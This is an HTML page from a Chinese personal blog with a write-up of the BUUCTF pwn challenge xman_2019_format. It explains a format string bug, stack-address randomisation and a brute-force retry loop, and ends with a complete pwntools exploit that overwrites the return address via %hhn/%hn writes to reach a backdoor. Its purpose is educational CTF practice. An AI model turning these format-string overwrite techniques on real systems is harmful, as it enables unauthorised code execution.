@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>【爆破栈末位】xman_2019_format - Peter Liu的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="BUUCTF xman_2019_format的解析">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Writeups",
+      "item":"https://peterliuzhi.top/writeup/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"【爆破栈末位】xman_2019_format",
+      "item":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/"
+    },
+    "headline": "【爆破栈末位】xman_2019_format - Peter Liu的个人博客","datePublished": "2022-12-29T03:01:44+08:00",
+    "dateModified": "2022-12-29T03:01:44+08:00",
+    "wordCount":  1048 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/selficon.jpg"
+        }
+        },
+    "description": "BUUCTF xman_2019_format的解析"
+}
+</script><meta property="og:title" content="【爆破栈末位】xman_2019_format - Peter Liu的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/" />
+
+
+
+<meta property="og:description" content="BUUCTF xman_2019_format的解析" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="Peter Liu的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+
+<meta property="article:section" content="writeup" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="爆破栈末位" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" />
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Peter Liu的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+        </div>
+
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">【爆破栈末位】xman_2019_format</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Thursday, December 29, 2022</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>3分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
+          >writeup</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+
+  <p><a href="https://buuoj.cn/challenges#xman_2019_format">原题链接</a></p>
+<ul>
+<li><a href="#checksec%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84">checksec查看程序架构</a></li>
+<li><a href="#ida%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida查看程序伪代码</a></li>
+<li><a href="#%E6%9E%84%E5%BB%BAexp">构建exp</a>
+<ul>
+<li><a href="#aslr%E5%AF%B9%E6%A0%88%E7%9A%84%E5%BD%B1%E5%93%8D">ASLR对栈的影响</a></li>
+<li><a href="#%E6%9E%84%E5%BB%BA%E5%9C%B0%E5%9D%80%E9%93%BE">构建地址链</a></li>
+<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4exp">完整exp</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="checksec查看程序架构">checksec查看程序架构</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">checksec</span> <span class="n">xman_2019_format</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Arch</span><span class="p">:</span>     <span class="n">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="n">little</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="ida查看程序伪代码">ida查看程序伪代码</h2>
+<p>整个程序反编译出来逻辑非常混乱，但重要的只有三个函数：
+<img src="../../image/https://peterliu-picbed.oss-cn-guangzhou.aliyuncs.com/img/202210122208112022-10-12-22-08-12.png" alt="202210122208112022-10-12-22-08-12"></p>
+<p>有一个后门函数</p>
+<p><img src="../../image/https://peterliu-picbed.oss-cn-guangzhou.aliyuncs.com/img/202210122157492022-10-12-21-57-50.png" alt="202210122157492022-10-12-21-57-50">【HarekazeCTF2019】baby_rop.md
+babyheap_0ctf_2017.md
+ciscn_2019_en_2.md
+ciscn_2019_es_2.md
+ciscn_2019_ne_5.md
+ciscn_s_3.md
+get_started_3dsctf_2016.md
+jarvisoj_fm.md
+jarvisoj_level2_x64.md
+not_the_same_3dsctf_2016.md
+others_shellcode.md
+pwn2_sctf_2016.md
+xman_2019_format.md
+暨南大学2022新生赛初赛 非官方WriteUp.md</p>
+<p>这个函数说明了buf也就是保存字符串的地址在堆中</p>
+<p><img src="../../image/https://peterliu-picbed.oss-cn-guangzhou.aliyuncs.com/img/202210122159042022-10-12-21-59-04.png" alt="202210122159042022-10-12-21-59-04"></p>
+<p>这个函数说明会将buf中的字符串以<code>|</code>为分割符分割成多个子字符串并打印</p>
+<p>这个程序因为只有一次输入的机会，而且无法更改ret值，所以获取shell权限要一次到位地完成，因此虽然可以泄露栈地址却难以加以利用。</p>
+<p>因此如果我们要更改栈地址，就需要用到爆破</p>
+<h2 id="构建exp">构建exp</h2>
+<h3 id="aslr对栈的影响">ASLR对栈的影响</h3>
+<p>首先，每次加载程序的时候，栈基址都是不一样的，但是后12位为0</p>
+<p>其次，因为页对齐的影响，因此栈地址除了栈基址还要加上一个页地址，这个页地址一定是4KB的整数倍，也就是说，这个页地址对最后12位是没有影响的</p>
+<p>然后，栈地址还要加上一个偏移，这个偏移会对栈地址后12位造成影响，经过调试发现，同一个地址在每次运行的时候，最后4位也就是地址的最后一个16进制数是不变的</p>
+<!-- 笔者发现不论是32位系统还是64位系统都有此现象，64位系统可能是栈对齐的影响，32位系统我咨询了其他师傅，有的说是32位系统的页大小只有6位，因此只影响末一位和末二位的一半，呈现出来就是只有末一位不变
+
+但是如果是这样，那么64位系统应该是末三位不变。但是笔者发现64位程序也是栈地址只有最后一位不变 -->
+<p>且看下述程序：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>运行结果：</p>
+<p><img src="../../image/202210131828022022-10-13-18-28-03.png" alt="202210131828022022-10-13-18-28-03"></p>
+<p>可以看到，对于64位程序，栈地址也是只有最后一位不变</p>
+<p>我们再来看下32位程序的情况：</p>
+<p><img src="../../image/202210131834552022-10-13-18-34-55.png" alt="202210131834552022-10-13-18-34-55"></p>
+<p>结论和64位程序是一样的</p>
+<p>笔者也不知道产生此现象的根本原因，只能当作一个既定事实记了。如果有师傅知道此现象的原因，希望能在评论区留下您的解释，感谢您的付出！</p>
+<blockquote>
+<p>笔者猜测原因：每次程序开始时会保证栈地址最后一位为0，这样经过既定数量的pop和push，在同一个相对位置的栈地址的最后一位是不变的</p>
+</blockquote>
+<h3 id="构建地址链">构建地址链</h3>
+<p><img src="../../image/202210122253222022-10-12-22-53-22.png" alt="202210122253222022-10-12-22-53-22"></p>
+<p>如图，如果我们用<code>%hhn</code>将ebp位置指向的地址改为ret地址，那么<code>0xffffd3b8</code>保存的地址就是ret地址，这样子我们就可以通过第三个红框框这条链来更改ret地址了</p>
+<h3 id="爆破">爆破</h3>
+<p>上述逻辑有一个问题，就是我们需要更改栈地址的末一个字节，而这个字节的高四位是不确定的，所以我们如果更改，则只有$\frac{1}{16}$的几率成功，那么我们就加一个while循环多试几次就好了</p>
+<h3 id="完整exp">完整exp</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./xman_2019_format&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./libc-2.23.so&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;28711&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x80485AB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset1</span> <span class="o">=</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">len1</span> <span class="o">=</span> <span class="mh">0x6c</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset2</span> <span class="o">=</span> <span class="mi">18</span>
+</span></span><span class="line"><span class="cl"><span class="n">len2</span> <span class="o">=</span> <span class="mh">0x85AB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">format_string</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">len1</span><span class="si">}</span><span class="s1">c%</span><span class="si">{</span><span class="n">offset1</span><span class="si">}</span><span class="s1">$hhn|%</span><span class="si">{</span><span class="n">len2</span><span class="si">}</span><span class="s1">c%</span><span class="si">{</span><span class="n">offset2</span><span class="si">}</span><span class="s1">$hn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="n">format_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;b* 0x400BA1&#34;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="n">libc_name</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">format_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;b* 0x804860B&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="s2">&#34;failed!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div>
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8D/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#爆破栈末位</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >上一页</span
+        >
+        <a href="https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/" class="block">【unlink】BUUCTF hitcontraining_unlink</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E&#43;ret2libcpwn2_sctf_2016/" class="block">【符号位漏洞&#43;ret2libc】pwn2_sctf_2016</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#checksec查看程序架构">checksec查看程序架构</a></li>
+        <li><a href="#ida查看程序伪代码">ida查看程序伪代码</a></li>
+        <li><a href="#构建exp">构建exp</a>
+          <ul>
+            <li><a href="#aslr对栈的影响">ASLR对栈的影响</a></li>
+            <li><a href="#构建地址链">构建地址链</a></li>
+            <li><a href="#爆破">爆破</a></li>
+            <li><a href="#完整exp">完整exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">【32位系统传参】BUUCTF picoctf_2018_rop chain</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">【C&#43;&#43;Pwn】[ZJCTF 2019]Login</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">【C内嵌汇编】others_shellcode</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="no-underline">【HarekazeCTF2019】baby_rop</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
